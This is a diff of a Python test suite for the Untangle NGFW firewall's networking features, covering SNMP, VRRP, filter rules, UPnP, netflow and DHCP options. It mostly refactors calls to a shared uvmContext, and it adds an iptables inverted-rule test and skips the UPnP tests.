+        assert dyn_IP_found, "dynamnid DNS succeeded"
+
     # Test VRRP is active
     @pytest.mark.slow
     def test_110_vrrp(self):
         "Test that a VRRP alias is pingable"
         if runtests.quick_tests_only:
             raise unittest.SkipTest('Skipping a time consuming test')
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         # Find a static interface
         i=0
         interfaceNotFound = True
@@ -1101,17 +1181,22 @@ class NetworkTests(NGFWTestCase):
         netsettings['interfaces']['list'][i]['vrrpEnabled'] = True
         netsettings['interfaces']['list'][i]['vrrpId'] = 2
         netsettings['interfaces']['list'][i]['vrrpPriority'] = 1
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         for x in range(3):
             pingResult = remote_control.run_command("ping -c 1 %s" % str(vrrpIP))
             if pingResult == 0:
                 break
-        isMaster = uvmContext.networkManager().isVrrpMaster(interfaceId)
+        #Fix for ATS server, recheck if isVrrpMaster is taking time
+        for x in range(4):
+            isMaster = global_functions.uvmContext.networkManager().isVrrpMaster(interfaceId)
+            if isMaster:
+                print("VRRP master is enabled after {} iterations".format(str(x)))
+                break
         onlineResults = remote_control.is_online()
 
         # Return to default network state
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
         assert (isMaster)
         assert (pingResult == 0)
@@ -1129,7 +1214,7 @@ class NetworkTests(NGFWTestCase):
         # None and 0 are "auto"
         mtus = [None, 0, 1460, 1500, 9000]
 
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
 
         # Perform MTU tests against WAN devices.
         # Since tests are run from LAN devices, if something goes bad, 
@@ -1182,7 +1267,7 @@ class NetworkTests(NGFWTestCase):
                             netsettings['devices']['list'][i]['mtu'] = mtu
                             break
 
-                uvmContext.networkManager().setNetworkSettings(netsettings)
+                global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
                 for wan_index, device in enumerate(wan_physical_devices):
                     # Get the device MTU
@@ -1217,7 +1302,7 @@ class NetworkTests(NGFWTestCase):
         for i in range(len(netsettings['devices']['list'])):
             netsettings['devices']['list'][i]['mtu'] = 0
 
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         # Manually set interface mtus back to original values
         for index, device in enumerate(wan_physical_devices):
@@ -1228,8 +1313,8 @@ class NetworkTests(NGFWTestCase):
     # SNMP, v1/v2enabled, v3 disabled
     def test_130_snmp_v1v2_only(self):
         verify_snmp_walk()
-        orig_system_settings = uvmContext.systemManager().getSettings()
-        system_settings = uvmContext.systemManager().getSettings()
+        orig_system_settings = global_functions.uvmContext.systemManager().getSettings()
+        system_settings = global_functions.uvmContext.systemManager().getSettings()
         system_settings['snmpSettings']['enabled'] = True
         system_settings['snmpSettings']['communityString'] = "atstest"
         system_settings['snmpSettings']['sysContact'] = "qa@untangle.com"
@@ -1237,17 +1322,17 @@ class NetworkTests(NGFWTestCase):
         system_settings['snmpSettings']['trapHost'] = remote_control.client_ip
         system_settings['snmpSettings']['port'] = 161
         system_settings['snmpSettings']['v3Enabled'] = False
-        uvmContext.systemManager().setSettings(system_settings)
+        global_functions.uvmContext.systemManager().setSettings(system_settings)
         v2cResult = remote_control.run_command("snmpwalk -v 2c -c atstest " +  global_functions.get_lan_ip() + " | grep untangle")
         v3Result = remote_control.run_command("snmpwalk -v 3 -u testuser -l authPriv -a sha -A password -x des -X drowssap " +  global_functions.get_lan_ip() + " | grep untangle")
-        uvmContext.systemManager().setSettings(orig_system_settings)
+        global_functions.uvmContext.systemManager().setSettings(orig_system_settings)
         assert( v2cResult == 0 )
         assert( v3Result == 1 )
 
     def test_133_snmp_v3_sha_des(self):
         verify_snmp_walk()
-        orig_system_settings = uvmContext.systemManager().getSettings()
-        system_settings = uvmContext.systemManager().getSettings()
+        orig_system_settings = global_functions.uvmContext.systemManager().getSettings()
+        system_settings = global_functions.uvmContext.systemManager().getSettings()
         system_settings['snmpSettings']['enabled'] = True
         system_settings['snmpSettings']['communityString'] = "atstest"
         system_settings['snmpSettings']['sysContact'] = "qa@untangle.com"
@@ -1255,17 +1340,17 @@ class NetworkTests(NGFWTestCase):
         system_settings['snmpSettings']['trapHost'] = remote_control.client_ip
         system_settings['snmpSettings']['port'] = 161
         commands = set_snmp_v3_settings( system_settings['snmpSettings'], True, "testuser", "sha", "shapassword", "des", "despassword", False )
-        uvmContext.systemManager().setSettings(system_settings)
+        global_functions.uvmContext.systemManager().setSettings(system_settings)
         v2cResult = try_snmp_command( commands[0] )
         v3Result = try_snmp_command( commands[1] )
-        uvmContext.systemManager().setSettings(orig_system_settings)
+        global_functions.uvmContext.systemManager().setSettings(orig_system_settings)
         assert( v2cResult == 0 )
         assert( v3Result == 0 )
 
     def test_134_snmp_v3_sha_aes(self):
         verify_snmp_walk()
-        orig_system_settings = uvmContext.systemManager().getSettings()
-        system_settings = uvmContext.systemManager().getSettings()
+        orig_system_settings = global_functions.uvmContext.systemManager().getSettings()
+        system_settings = global_functions.uvmContext.systemManager().getSettings()
         system_settings['snmpSettings']['enabled'] = True
         system_settings['snmpSettings']['communityString'] = "atstest"
         system_settings['snmpSettings']['sysContact'] = "qa@untangle.com"
@@ -1273,17 +1358,17 @@ class NetworkTests(NGFWTestCase):
         system_settings['snmpSettings']['trapHost'] = remote_control.client_ip
         system_settings['snmpSettings']['port'] = 161
         commands = set_snmp_v3_settings( system_settings['snmpSettings'], True, "testuser", "sha", "shapassword", "aes", "aespassword", False )
-        uvmContext.systemManager().setSettings(system_settings)
+        global_functions.uvmContext.systemManager().setSettings(system_settings)
         v2cResult = try_snmp_command( commands[0] )
         v3Result = try_snmp_command( commands[1] )
-        uvmContext.systemManager().setSettings(orig_system_settings)
+        global_functions.uvmContext.systemManager().setSettings(orig_system_settings)
         assert( v2cResult == 0 )
         assert( v3Result == 0 )
 
     def test_135_snmp_v3_md5_des(self):
         verify_snmp_walk()
-        orig_system_settings = uvmContext.systemManager().getSettings()
-        system_settings = uvmContext.systemManager().getSettings()
+        orig_system_settings = global_functions.uvmContext.systemManager().getSettings()
+        system_settings = global_functions.uvmContext.systemManager().getSettings()
         system_settings['snmpSettings']['enabled'] = True
         system_settings['snmpSettings']['communityString'] = "atstest"
         system_settings['snmpSettings']['sysContact'] = "qa@untangle.com"
@@ -1291,17 +1376,17 @@ class NetworkTests(NGFWTestCase):
         system_settings['snmpSettings']['trapHost'] = remote_control.client_ip
         system_settings['snmpSettings']['port'] = 161
         commands = set_snmp_v3_settings( system_settings['snmpSettings'], True, "testuser", "md5", "md5password", "des", "despassword", False )
-        uvmContext.systemManager().setSettings(system_settings)
+        global_functions.uvmContext.systemManager().setSettings(system_settings)
         v2cResult = try_snmp_command( commands[0] )
         v3Result = try_snmp_command( commands[1] )
-        uvmContext.systemManager().setSettings(orig_system_settings)
+        global_functions.uvmContext.systemManager().setSettings(orig_system_settings)
         assert( v2cResult == 0 )
         assert( v3Result == 0 )
 
     def test_136_snmp_v3_md5_aes(self):
         verify_snmp_walk()
-        orig_system_settings = uvmContext.systemManager().getSettings()
-        system_settings = uvmContext.systemManager().getSettings()
+        orig_system_settings = global_functions.uvmContext.systemManager().getSettings()
+        system_settings = global_functions.uvmContext.systemManager().getSettings()
         system_settings['snmpSettings']['enabled'] = True
         system_settings['snmpSettings']['communityString'] = "atstest"
         system_settings['snmpSettings']['sysContact'] = "qa@untangle.com"
@@ -1309,17 +1394,17 @@ class NetworkTests(NGFWTestCase):
         system_settings['snmpSettings']['trapHost'] = remote_control.client_ip
         system_settings['snmpSettings']['port'] = 161
         commands = set_snmp_v3_settings( system_settings['snmpSettings'], True, "testuser", "md5", "md5password", "aes", "aespassword", False )
-        uvmContext.systemManager().setSettings(system_settings)
+        global_functions.uvmContext.systemManager().setSettings(system_settings)
         v2cResult = try_snmp_command( commands[0] )
         v3Result = try_snmp_command( commands[1] )
-        uvmContext.systemManager().setSettings(orig_system_settings)
+        global_functions.uvmContext.systemManager().setSettings(orig_system_settings)
         assert( v2cResult == 0 )
         assert( v3Result == 0 )
 
     def test_137_snmp_v3_required(self):
         verify_snmp_walk()
-        orig_system_settings = uvmContext.systemManager().getSettings()
-        system_settings = uvmContext.systemManager().getSettings()
+        orig_system_settings = global_functions.uvmContext.systemManager().getSettings()
+        system_settings = global_functions.uvmContext.systemManager().getSettings()
         system_settings['snmpSettings']['enabled'] = True
         system_settings['snmpSettings']['communityString'] = "atstest"
         system_settings['snmpSettings']['sysContact'] = "qa@untangle.com"
@@ -1327,21 +1412,21 @@ class NetworkTests(NGFWTestCase):
         system_settings['snmpSettings']['trapHost'] = remote_control.client_ip
         system_settings['snmpSettings']['port'] = 161
         commands = set_snmp_v3_settings( system_settings['snmpSettings'], True, "testuser", "sha", "shapassword", "aes", "aespassword", True )
-        uvmContext.systemManager().setSettings(system_settings)
+        global_functions.uvmContext.systemManager().setSettings(system_settings)
         v2cResult = try_snmp_command( commands[0] )
         v3Result = try_snmp_command( commands[1] )
-        uvmContext.systemManager().setSettings(orig_system_settings)
+        global_functions.uvmContext.systemManager().setSettings(orig_system_settings)
         assert( v2cResult == 1 )
         assert( v3Result == 0 )
 
     def test_138_snmp_disabled(self):
         verify_snmp_walk()
-        orig_system_settings = uvmContext.systemManager().getSettings()
-        system_settings = uvmContext.systemManager().getSettings()
+        orig_system_settings = global_functions.uvmContext.systemManager().getSettings()
+        system_settings = global_functions.uvmContext.systemManager().getSettings()
         system_settings['snmpSettings']['enabled'] = False
-        uvmContext.systemManager().setSettings(system_settings)
+        global_functions.uvmContext.systemManager().setSettings(system_settings)
         result = remote_control.run_command("snmpwalk -v 2c -c atstest " + global_functions.get_lan_ip() + " | grep untangle")
-        uvmContext.systemManager().setSettings(orig_system_settings)
+        global_functions.uvmContext.systemManager().setSettings(orig_system_settings)
         assert(result == 1)
 
     def test_140_sessions_table(self):
@@ -1351,7 +1436,7 @@ class NetworkTests(NGFWTestCase):
         while ((not found_test_session) and (loopLimit > 0)):
             loopLimit -= 1
             time.sleep(1)
-            result = uvmContext.sessionMonitor().getMergedSessions()
+            result = global_functions.uvmContext.sessionMonitor().getMergedSessions()
             sessionList = result['list']
             # find session generated with netcat in session table.
             for i in range(len(sessionList)):
@@ -1370,7 +1455,7 @@ class NetworkTests(NGFWTestCase):
         found_test_session = False
         remote_control.run_command("nohup netcat -d -4 test.untangle.com 80 >/dev/null 2>&1",stdout=False,nowait=True)
         time.sleep(2) # since we launched netcat in background, give it a second to establish connection
-        result = uvmContext.hostTable().getHosts()
+        result = global_functions.uvmContext.hostTable().getHosts()
         hostList = result['list']
         # find session generated with netcat in session table.
         for i in range(len(hostList)):
@@ -1391,10 +1476,10 @@ class NetworkTests(NGFWTestCase):
         result1 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com"))
 
         # Add a block rule for port 80 and enabled blocked session logging
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         netsettings['filterRules']['list'] = [ create_filter_rules("DST_PORT","80","PROTOCOL","TCP",True) ]
         netsettings['logBlockedSessions'] = True
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         for i in range(0, 10):
             # make the request again which should now be blocked and logged
@@ -1417,7 +1502,7 @@ class NetworkTests(NGFWTestCase):
             time.sleep(10)
 
         # put the network settings back the way we found them
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
         # make sure all of our tests were successful
         assert (result1 == 0)
@@ -1426,21 +1511,49 @@ class NetworkTests(NGFWTestCase):
         assert(events != None)
         assert(found)
 
+    
+    def test_148_invert_iptables_command(self):
+        file_path = '/etc/untangle/iptables-rules.d/240-filter-rules'
+          # Lines to search for in the file content
+        expected_iptables_commands = [
+            "${IPTABLES} -t filter -A filter-rules  -m mac ! --mac-source 08:00:27:96:11:ee  -m comment --comment \"Rule #1\"  -m iprange ! --src-range 192.168.56.150-192.168.56.155  -j NFLOG --nflog-prefix 'filter_blocked'",
+            "${IPTABLES} -t filter -A filter-rules  -m mac ! --mac-source 08:00:27:96:11:ee  -m comment --comment \"Rule #1\"  -m iprange ! --src-range 192.168.56.150-192.168.56.155  -j REJECT",
+            "${IP6TABLES} -t filter -A filter-rules  -m mac ! --mac-source 08:00:27:96:11:ee  -m comment --comment \"Rule #1\"  -m iprange ! --src-range 192.168.56.150-192.168.56.155  -j REJECT"
+        ]
+        
+        # Add a block rule with invert operator for MacAddress and 
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
+        netsettings['filterRules']['list'] = [ create_invert_filter_rules("SRC_MAC","08:00:27:96:11:ee","SRC_ADDR","192.168.56.150-192.168.56.155",True) ]
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
+
+        # Open the file and check if the command is generated as expected
+        with open(file_path, 'r') as file:
+            file_contents = file.read()
+            # Check if each line is present in the file content
+            all_lines_found = all(expected_iptables_commands in file_contents for expected_iptables_commands in expected_iptables_commands)
+
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        # Check if the expected command is equals to actual command
+        if all_lines_found:
+            self.assertTrue(True)  
+        else:
+            self.assertTrue(False)
+
     # Test that filter rule's SRC_ADDR condition supports commas
     def test_151_filter_rules_blocked_src_comma(self):
         # verify port 80 is open
         result1 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com"))
 
         # Add a block rule for port 80 and enabled blocked session logging
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         netsettings['filterRules']['list'] = [ create_filter_rules("SRC_ADDR",remote_control.client_ip+",1.2.3.4","PROTOCOL","TCP",True) ]
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         # make the request again which should now be blocked
         result2 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com/"))
 
         # put the network settings back the way we found them
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
         assert (result1 == 0)
         assert (result2 != 0)
@@ -1457,15 +1570,15 @@ class NetworkTests(NGFWTestCase):
         str += remote_control.client_ip
 
         # Add a block rule for port 80 and enabled blocked session logging
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         netsettings['filterRules']['list'] = [ create_filter_rules("SRC_ADDR",str,"PROTOCOL","TCP",True) ]
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         # make the request again which should now be blocked
         result2 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com/"))
 
         # put the network settings back the way we found them
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
         assert (result1 == 0)
         assert (result2 != 0)
@@ -1474,7 +1587,7 @@ class NetworkTests(NGFWTestCase):
     def test_153_filter_rules_blocked_src_mac_comma(self):
         remote_control.run_command("nohup netcat -d -4 test.untangle.com 80 >/dev/null 2>&1",stdout=False,nowait=True)
         time.sleep(2) # since we launched netcat in background, give it a second to establish connection
-        host_list = uvmContext.hostTable().getHosts()['list']
+        host_list = global_functions.uvmContext.hostTable().getHosts()['list']
         # find session generated with netcat in session table.
         for i in range(len(host_list)):
             # print(host_list[i])
@@ -1492,15 +1605,15 @@ class NetworkTests(NGFWTestCase):
         result1 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com"))
 
         # Add a block rule for port 80 and enabled blocked session logging
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         netsettings['filterRules']['list'] = [ create_filter_rules("SRC_MAC",found_host.get('macAddress')+",22:22:22:22:22:22","PROTOCOL","TCP",True) ]
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         # make the request again which should now be blocked
         result2 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com/"))
 
         # put the network settings back the way we found them
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
         assert (result1 == 0)
         assert (result2 != 0)
@@ -1513,9 +1626,9 @@ class NetworkTests(NGFWTestCase):
         global_functions.host_tags_add("foobar")
         
         # Add a block rule for port 80 and enabled blocked session logging
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         netsettings['filterRules']['list'] = [ create_filter_rules("CLIENT_TAGGED","foobar","PROTOCOL","TCP",True) ]
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         # make the request again which should now be blocked
         result2 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri="http://test.untangle.com/"))
@@ -1523,7 +1636,7 @@ class NetworkTests(NGFWTestCase):
         global_functions.host_tags_clear()
         
         # put the network settings back the way we found them
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
         assert (result1 == 0)
         assert (result2 != 0)
@@ -1539,37 +1652,40 @@ class NetworkTests(NGFWTestCase):
 
     # UPnP - Disabled
     def test_170_upnp_disabled(self):
+        raise unittest.SkipTest("Upnpc no longer supported NGFW-13995")
         upnpc_exists = remote_control.run_command("test -x /usr/bin/upnpc")
         if upnpc_exists != 0:
             raise unittest.SkipTest("Upnpc app needs to be installed on client")
         if global_functions.is_bridged(wan_ip):
             raise unittest.SkipTest("Unable to disable upnp on bridged configurations")
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         netsettings['upnpSettings']['upnpEnabled'] = False
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
         result = remote_control.run_command("/usr/bin/upnpc -i -a %s 5559 5559 tcp >/dev/null 2>&1" % (remote_control.client_ip),stdout=False)
         assert(result != 0)
 
     # UPnP - Enabled
     def test_171_upnp_enabled_defaults(self):
+        raise unittest.SkipTest("Upnpc no longer supported NGFW-13995")
         upnpc_exists = remote_control.run_command("test -x /usr/bin/upnpc")
         if upnpc_exists != 0:
             raise unittest.SkipTest("Upnpc app needs to be installed on client")
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         netsettings['upnpSettings']['upnpEnabled'] = True
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
         result = remote_control.run_command("/usr/bin/upnpc -i -a %s 5559 5559 tcp >/dev/null 2>&1" % (remote_control.client_ip),stdout=False)
         assert(result == 0)
 
     # UPnP - Secure mode enabled
     def test_172_upnp_secure_mode_enabled(self):
+        raise unittest.SkipTest("Upnpc no longer supported NGFW-13995")
         upnpc_exists = remote_control.run_command("test -x /usr/bin/upnpc")
         if upnpc_exists != 0:
             raise unittest.SkipTest("Upnpc app needs to be installed on client")
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         netsettings['upnpSettings']['upnpEnabled'] = True
         netsettings['upnpSettings']['secureMode'] = True
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
         result1 = remote_control.run_command("/usr/bin/upnpc -i -a %s 5559 5559 tcp >/dev/null 2>&1" % (remote_control.client_ip),stdout=False)
         result2 = remote_control.run_command("/usr/bin/upnpc -i -a %s 5558 5558 tcp 2>&1 | grep ConflictInMappingEntry" % ("1.2.3.4"),stdout=False)
         assert(result1 == 0)
@@ -1577,13 +1693,14 @@ class NetworkTests(NGFWTestCase):
 
     # UPnP - Secure mode disabled
     def test_173_upnp_secure_mode_disabled(self):
+        raise unittest.SkipTest("Upnpc no longer supported NGFW-13995")
         upnpc_exists = remote_control.run_command("test -x /usr/bin/upnpc")
         if upnpc_exists != 0:
             raise unittest.SkipTest("Upnpc app needs to be installed on client")
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         netsettings['upnpSettings']['upnpEnabled'] = True
         netsettings['upnpSettings']['secureMode'] = False
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
         result1 = remote_control.run_command("/usr/bin/upnpc -i -a %s 5559 5559 tcp >/dev/null 2>&1" % (remote_control.client_ip),stdout=False)
         result2 = remote_control.run_command("/usr/bin/upnpc -i -a %s 5558 5558 tcp 2>&1 | grep ConflictInMappingEntry" % ("1.2.3.4"),stdout=False)
         assert(result1 == 0)
@@ -1591,10 +1708,11 @@ class NetworkTests(NGFWTestCase):
 
     # UPnP - Enabled, Deny rule
     def test_174_upnp_rules_deny_all(self):
+        raise unittest.SkipTest("Upnpc no longer supported NGFW-13995")
         upnpc_exists = remote_control.run_command("test -x /usr/bin/upnpc")
         if upnpc_exists != 0:
             raise unittest.SkipTest("Upnpc app needs to be installed on client")
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         netsettings['upnpSettings']['upnpEnabled'] = True
         netsettings['upnpSettings']['upnpRules'] = {
             "javaClass": "java.util.LinkedList",
@@ -1630,26 +1748,26 @@ class NetworkTests(NGFWTestCase):
                 }                
             ]
         }
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
         result = remote_control.run_command("/usr/bin/upnpc -i -a %s 5559 5559 tcp 2>&1 | grep failed" % (remote_control.client_ip),stdout=False)
         assert(result == 0)
 
     def test_180_netflow_enable_disable(self):
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         netsettings['netflowSettings']['enabled'] = True
         netsettings['netflowSettings']['host'] = global_functions.LIST_SYSLOG_SERVER
         netsettings['netflowSettings']['port'] = 9555
         netsettings['netflowSettings']['version'] = "9"
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
         # check if netflow is running
         result1 = subprocess.call("ps aux | grep softflowd | grep -v grep >/dev/null 2>&1", shell=True)
 
         # check if netflow stops running if disabled.
         netsettings['netflowSettings']['enabled'] = False
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
         result2 = subprocess.call("ps aux | grep softflowd | grep -v grep >/dev/null 2>&1", shell=True)
 
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
         assert(result1 == 0)
         assert(result2 == 1)
@@ -1657,7 +1775,7 @@ class NetworkTests(NGFWTestCase):
     def test_190_qos_statistics(self):
         # Check of the QoS Statistics script is returning the proper string.        
         # Enable QoS if not enabled
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         netsettings['qosSettings']['qosEnabled'] = True
         i = 0
         for interface in netsettings['interfaces']['list']:
@@ -1667,7 +1785,7 @@ class NetworkTests(NGFWTestCase):
             i += 1
         netsettings['bypassRules']['list'] = []
         netsettings['qosSettings']['qosRules']['list'] = []
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
         
         found = False
         timeout = 60
@@ -1698,7 +1816,7 @@ class NetworkTests(NGFWTestCase):
         """
         wireless_interfaces_found = False
         wireless_system_dev = None
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         for interface in netsettings['interfaces']['list']:
             if interface['isWirelessInterface'] is True:
                 wireless_interfaces_found = True
@@ -1708,7 +1826,7 @@ class NetworkTests(NGFWTestCase):
         if wireless_interfaces_found is False:
             raise unittest.SkipTest("missing wireless interfaces")
 
-        channels = uvmContext.networkManager().getWirelessChannels(wireless_system_dev,"")
+        channels = global_functions.uvmContext.networkManager().getWirelessChannels(wireless_system_dev,"")
         assert(len(channels) > 0)
 
     def test_202_wireless_test_country_code_channels(self):
@@ -1718,7 +1836,7 @@ class NetworkTests(NGFWTestCase):
         wireless_interfaces_found = False
         wireless_system_dev = None
         original_wireless_country_code = None
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         for interface in netsettings['interfaces']['list']:
             if interface['isWirelessInterface'] is True:
                 wireless_interfaces_found = True
@@ -1730,21 +1848,21 @@ class NetworkTests(NGFWTestCase):
         if wireless_interfaces_found is False:
             raise unittest.SkipTest("missing wireless interfaces")
 
-        if uvmContext.networkManager().isWirelessRegulatoryCompliant(wireless_system_dev) is False:
+        if global_functions.uvmContext.networkManager().isWirelessRegulatoryCompliant(wireless_system_dev) is False:
             raise unittest.SkipTest("cannot change country code on non-compliant driver")
 
         # Get current channels
-        original_channels = uvmContext.networkManager().getWirelessChannels(wireless_system_dev,"")
+        original_channels = global_functions.uvmContext.networkManager().getWirelessChannels(wireless_system_dev,"")
         assert(len(original_channels) > 0)
 
-        current_driver_regulatory_country_code = uvmContext.networkManager().getWirelessRegulatoryCountryCode(wireless_system_dev)
+        current_driver_regulatory_country_code = global_functions.uvmContext.networkManager().getWirelessRegulatoryCountryCode(wireless_system_dev)
 
         # Want a different regulatory country code to verify the country counts are not the same
         if original_wireless_country_code == "US" or current_driver_regulatory_country_code == "US":
             test_country_code = "JP"
         else:
             test_country_code = "US"
-        test_channels = uvmContext.networkManager().getWirelessChannels(wireless_system_dev,test_country_code)
+        test_channels = global_functions.uvmContext.networkManager().getWirelessChannels(wireless_system_dev,test_country_code)
         assert(len(test_channels) > 0)
 
         print(f"expecting: original_channels={len(original_channels)} != test_channels={len(test_channels)}")
@@ -1758,7 +1876,7 @@ class NetworkTests(NGFWTestCase):
         """
         wireless_interfaces_found = False
         wireless_system_dev = None
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         for interface in netsettings['interfaces']['list']:
             if interface['isWirelessInterface'] is True:
                 wireless_interfaces_found = True
@@ -1768,7 +1886,7 @@ class NetworkTests(NGFWTestCase):
         if wireless_interfaces_found is False:
             raise unittest.SkipTest("missing wireless interfaces")
 
-        countries = uvmContext.networkManager().getWirelessValidRegulatoryCountryCodes(wireless_system_dev)
+        countries = global_functions.uvmContext.networkManager().getWirelessValidRegulatoryCountryCodes(wireless_system_dev)
         print(countries)
         assert(len(countries) > 0)
 
@@ -1777,7 +1895,7 @@ class NetworkTests(NGFWTestCase):
         Verify DHCP server on LAN interface
         """
         lan_interface = None
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         for interface in netsettings['interfaces']['list']:
             if interface.get("configType") != 'ADDRESSED':
                 continue
@@ -1804,7 +1922,7 @@ class NetworkTests(NGFWTestCase):
         lan_interface["dhcpPrefixOverride"] = None
         lan_interface["dhcpOptions"]["list"] = []
 
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         dhcp_results = global_functions.get_dhcp_client_results()
         if dhcp_results["no_privileges"]:
@@ -1821,7 +1939,7 @@ class NetworkTests(NGFWTestCase):
         Verify DHCP server on LAN interface
         """
         lan_interface = None
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         for interface in netsettings['interfaces']['list']:
             if interface.get("configType") != 'ADDRESSED':
                 continue
@@ -1858,7 +1976,7 @@ class NetworkTests(NGFWTestCase):
             "value": f"4,{time_server}"
         }]
 
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         dhcp_results = global_functions.get_dhcp_client_results()
         if dhcp_results["no_privileges"]:
@@ -1885,7 +2003,7 @@ class NetworkTests(NGFWTestCase):
             "javaClass": "com.untangle.uvm.network.DhcpOption",
             "value": f"43,{vendor_specific_string}"
         }]
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         dhcp_results = global_functions.get_dhcp_client_results()
         if dhcp_results["no_privileges"]:
@@ -1903,7 +2021,7 @@ class NetworkTests(NGFWTestCase):
             "javaClass": "com.untangle.uvm.network.DhcpOption",
             "value": f"43,\"{vendor_specific_string}\""
         }]
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         dhcp_results = global_functions.get_dhcp_client_results()
         if dhcp_results["no_privileges"]:
@@ -1917,7 +2035,7 @@ class NetworkTests(NGFWTestCase):
         Verify DHCP dhcp on LAN interface
         """
         lan_interface = None
